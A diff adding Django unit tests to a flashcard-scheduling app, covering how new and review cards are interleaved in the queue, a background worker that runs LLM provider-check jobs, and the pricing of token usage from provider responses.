+            self._due_card(f'relearn{index}', CardSchedule.State.RELEARNING)
+        for index in range(2):
+            self._due_card(f'fresh{index}', CardSchedule.State.NEW)
+
+        for _ in range(2):
+            data = self._serve()
+            card_id = data['card']['id']
+            self.assertEqual(CardSchedule.objects.get(card_id=card_id).state, CardSchedule.State.NEW)
+            self._answer(card_id, previous_state=CardSchedule.State.NEW)
+        self.assertEqual(
+            CardSchedule.objects.get(card_id=self._serve()['card']['id']).state,
+            CardSchedule.State.RELEARNING,
+        )
+
+    def test_relearning_still_outranks_review_inside_the_non_new_queue(self):
+        self._due_card('later-review', CardSchedule.State.REVIEW, minutes_overdue=600)
+        self._due_card('urgent-relearn', CardSchedule.State.RELEARNING, minutes_overdue=1)
+        self.profile.new_card_order = UserProfile.NewCardOrder.AFTER_REVIEWS
+        self.profile.save(update_fields=['new_card_order'])
+        self.assertEqual(self._serve()['card']['term'], 'urgent-relearn')
+
+    def test_the_daily_new_limit_still_caps_the_mix(self):
+        self.profile.daily_new_limit = 2
+        self.profile.save(update_fields=['daily_new_limit'])
+        for index in range(4):
+            self._due_card(f'relearn{index}', CardSchedule.State.RELEARNING)
+        for index in range(10):
+            self._due_card(f'fresh{index}', CardSchedule.State.NEW)
+        data = self._serve()
+        self.assertEqual(data['queue_breakdown']['new'], 2)
+        self.assertEqual(data['queue_count'], 6)
+
+    def test_new_cards_alone_are_served_without_a_review_queue(self):
+        for index in range(3):
+            self._due_card(f'fresh{index}', CardSchedule.State.NEW)
+        self.assertEqual(CardSchedule.objects.get(card_id=self._serve()['card']['id']).state, CardSchedule.State.NEW)
+
+    def test_the_serving_rule_is_stateless_and_evenly_spread(self):
+        from learning.services.queues import serve_new_next
+        # 20 new among 100 cards: a new card every fifth card, decided only from
+        # counts so a page reload or a second device sees the same next card.
+        served = []
+        new_done = cards_done = 0
+        for _ in range(100):
+            take_new = serve_new_next(
+                new_done=new_done, cards_done=cards_done,
+                new_left=20 - new_done, review_left=80 - (cards_done - new_done),
+            )
+            served.append('N' if take_new else 'R')
+            new_done += int(take_new)
+            cards_done += 1
+        self.assertEqual(served.count('N'), 20)
+        gaps = [index for index, value in enumerate(served) if value == 'N']
+        spacing = [second - first for first, second in zip(gaps, gaps[1:])]
+        self.assertTrue(all(4 <= step <= 6 for step in spacing), spacing)
+
+    def test_the_setting_round_trips_and_rejects_nonsense(self):
+        response = self.client.patch('/api/settings/', {'new_card_order': 'before_reviews'}, format='json')
+        self.assertEqual(response.status_code, 200)
+        self.assertEqual(response.data['new_card_order'], 'before_reviews')
+        bad = self.client.patch('/api/settings/', {'new_card_order': 'whenever'}, format='json')
+        self.assertEqual(bad.status_code, 400)
+
+
+class ProviderCheckWorkerTests(ApiTransactionBase):
+    """The durable worker owns provider checks; a request only queues them."""
+
+    def setUp(self):
+        super().setUp()
+        self.user.is_staff = True
+        self.user.save(update_fields=['is_staff'])
+        self.profile.provider_tokens_encrypted = {'deepseek': encrypt_secret('ds-test-key')}
+        self.profile.save(update_fields=['provider_tokens_encrypted'])
+
+    @override_settings(PROVIDER_ADAPTER_AUTHORING=False)
+    @patch('learning.services.provider_updates.canary_models')
+    @patch('learning.services.provider_updates.enrich_catalog_with_ai')
+    @patch('learning.services.provider_updates.discover_provider_models')
+    def test_the_worker_claims_and_finishes_a_queued_check(self, discover, enrich, canary):
+        from django.core.management import call_command
+        discover.return_value = ['deepseek-v4-flash']
+        enrich.return_value = ([], None, 0)
+        canary.side_effect = lambda entries, token: (entries, {})
+        job = ProviderCheckJob.objects.create(user=self.user, provider='deepseek')
+
+        call_command('run_bulk_worker', '--once')
+
+        job.refresh_from_db()
+        self.assertEqual(job.status, ProviderCheckJob.Status.COMPLETED)
+        self.assertIsNotNone(job.started_at)
+        self.assertIsNotNone(job.finished_at)
+        self.assertEqual(job.result['provider'], 'deepseek')
+        # The profile is a model instance and must never reach the JSON column.
+        self.assertNotIn('profile', job.result)
+
+    @patch('learning.services.provider_updates.discover_provider_models')
+    def test_a_check_abandoned_by_a_restart_is_picked_up_again(self, discover):
+        from django.core.management import call_command
+        discover.side_effect = LlmResponseError('provider unreachable')
+        job = ProviderCheckJob.objects.create(
+            user=self.user, provider='deepseek',
+            status=ProviderCheckJob.Status.RUNNING,
+            heartbeat_at=timezone.now() - timedelta(hours=2),
+        )
+
+        call_command('run_bulk_worker', '--once')
+
+        job.refresh_from_db()
+        self.assertEqual(job.status, ProviderCheckJob.Status.FAILED)
+        self.assertIn('unreachable', job.error)
+
+    def test_the_worker_exits_cleanly_with_nothing_queued(self):
+        from django.core.management import call_command
+        call_command('run_bulk_worker', '--once')
+        self.assertFalse(ProviderCheckJob.objects.exists())
+
+
+class AdapterPricingTests(TestCase):
+    """A generated module reports tokens; prices stay in reviewed code."""
+
+    def test_deepseek_and_anthropic_usage_are_priced_from_the_raw_body(self):
+        from learning.services.adapters import priced_stats
+        deepseek = priced_stats('deepseek', 'deepseek-v4-flash', {
+            'stats': {'total_tokens': 350},
+            'response': {'usage': {
+                'prompt_cache_hit_tokens': 100,
+                'prompt_cache_miss_tokens': 50,
+                'completion_tokens': 200,
+            }},
+        })
+        self.assertGreater(deepseek['total_price'], 0)
+        self.assertEqual(deepseek['total_tokens'], 350)
+
+        anthropic = priced_stats('anthropic', 'claude-sonnet-5', {
+            'stats': {},
+            'response': {'usage': {'input_tokens': 1000, 'output_tokens': 500}},
+        })
+        self.assertAlmostEqual(anthropic['total_price'], 1000 * 3e-6 + 500 * 1.5e-5)
+
+    def test_a_price_the_module_reported_is_kept(self):
+        from learning.services.adapters import priced_stats
+        stats = priced_stats('openrouter', 'openai/gpt-5.2', {
+            'stats': {'total_price': 0.004},
+            'response': {'usage': {'cost': 0.009}},
+        })
+        self.assertEqual(stats['total_price'], 0.004)
+
+    def test_an_unpriceable_or_malformed_response_never_breaks_the_call(self):
+        from learning.services.adapters import priced_stats
+        self.assertEqual(priced_stats('deepseek', 'x', {'stats': {'total_tokens': 5}}), {'total_tokens': 5})
+        self.assertEqual(priced_stats('deepseek', 'x', {'stats': {}, 'response': {'usage': 'broken'}}), {})
+        self.assertEqual(priced_stats('openai', 'gpt-5-mini', {'stats': {}, 'response': {'usage': {}}}), {})
+
+    def test_a_generated_module_call_is_logged_with_its_cost(self):
+        from learning.services import adapters
+        from learning.services.llm import _adapter_post
+        user = User.objects.create_user('pricing', password='strong-pass-123')
+        UserProfile.objects.create(user=user)
+        RouterAdapter.objects.create(
+            provider='deepseek', revision=1, status=RouterAdapter.Status.ACTIVE,
+            source_code=SAMPLE_DEEPSEEK_ADAPTER.replace(
+                'return {\n        "response": body,',
+                'return {\n        "response": body,',
+            ),
+        )
+        adapters.forget_cached_adapters()
+        adapters.refresh_active_adapters()
+
+        async def fake_fetch(self, url, *, headers=None, json=None, method='POST', timeout=None):
+            return {
+                'choices': [{'message': {'content': 'hello'}}],
+                'usage': {'prompt_cache_hit_tokens': 10, 'prompt_cache_miss_tokens': 20, 'completion_tokens': 30},
+            }
+
+        with patch.object(adapters.AdapterContext, 'fetch', fake_fetch):
+            result = asyncio.run(_adapter_post(
+                'deepseek:deepseek-v4-flash', 'ds-key', [{'role': 'user', 'content': 'hi'}], 10,
+            ))
+        self.assertIsNotNone(result)
+        self.assertGreater(result['stats']['total_price'], 0)
+        usage = log_usage(
+            user=user, pool=None, card=None, operation=LlmUsage.Operation.GENERATION,
+            model='deepseek:deepseek-v4-flash', result=result,
+        )
+        self.assertGreater(usage.total_price, 0)
+        adapters.forget_cached_adapters()
